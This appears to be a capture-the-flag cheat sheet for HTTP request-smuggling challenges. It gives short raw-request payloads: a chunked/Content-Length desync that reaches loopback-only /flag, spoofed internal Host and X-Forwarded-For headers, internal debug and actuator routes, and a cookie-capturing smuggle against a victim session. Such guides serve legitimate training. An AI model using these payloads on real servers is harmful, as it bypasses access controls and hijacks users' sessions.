# Desync flags — the flag-fetch via smuggle

## The internal-route flag — `GET /flag`

```text
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /flag HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

`/flag` loopback-only — the smuggle reaches it — the flag in the response —
`internal-routes.md`.

## The internal-vhost flag — `Host: internal`

```text
GET /flag HTTP/1.1
Host: internal
```

smuggled — `virtual-host.md`.

## The trusted-header flag — `X-Forwarded-For: 127.0.0.1`

```text
GET /flag HTTP/1.1
X-Forwarded-For: 127.0.0.1
```

smuggled — `internal-routes.md`.

## The session-hijack flag — the victim's cookie

```text
POST /store HTTP/1.1
Content-Length: 400

x=
```

The victim's `Cookie: flag=...` inside `x=` — `session-hijack.md`.

## The admin-bot flag — the bot's request

```text
[smuggle poisons the admin-bot's request]
```

`client-side-desync.md`.

## The debug-route flag — `/debug/flag`

```text
GET /debug/flag HTTP/1.1
```

smuggled — `internal-api.md`.

## The env-route flag — `/actuator/env`

```text
GET /actuator/env HTTP/1.1
```

smuggled — `internal-api.md`.

## The metrics-route flag — `/metrics`

```text
GET /metrics HTTP/1.1
```

smuggled — `internal-api.md`.

## The stored-param flag — `/store/last`

```text
GET /store/last HTTP/1.1
```

the stored request carries the flag — `session-hijack.md`.

## The verbatim excerpt — the flag's bytes

```bash
python3 tools/hooks.py pre-flag <name> --value "flag{...}" \
  --source "response" --evidence "<the verbatim excerpt>"
```

`evidence-rules.md`.
